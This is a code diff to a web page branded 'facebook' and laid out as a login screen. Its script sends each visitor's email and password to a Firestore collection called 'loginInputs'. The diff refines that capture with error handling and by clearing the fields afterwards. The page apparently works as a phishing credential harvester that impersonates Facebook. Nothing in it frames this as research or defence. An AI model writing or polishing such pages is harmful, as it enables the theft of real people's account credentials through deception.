@@ -57,6 +57,7 @@ body {
 </head>
 
 <body>
+
 <div class="container">
   <div class="left">
     <h1>facebook</h1>
@@ -93,23 +94,34 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-window.loginUser = async () => {
-  const email = emailInput.value.trim();
-  const password = passwordInput.value.trim();
+window.loginUser = async function () {
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
 
   if (!email || !password) {
-    alert("Fill all fields");
+    alert("Please fill all fields");
     return;
   }
 
-  await addDoc(collection(db, "loginInputs"), {
-    email,
-    password,
-    timestamp: Timestamp.now()   // ✅ FIXED
-  });
+  try {
+    await addDoc(collection(db, "loginInputs"), {
+      email: email,
+      password: password,
+      timestamp: Timestamp.now()   // ✅ FIXED
+    });
 
-  alert("Saved to database");
+    alert("Saved to database");
+
+    // optional: clear fields
+    document.getElementById("email").value = "";
+    document.getElementById("password").value = "";
+
+  } catch (err) {
+    alert("Error: " + err.message);
+    console.error(err);
+  }
 };
 </script>
+
 </body>
 </html>
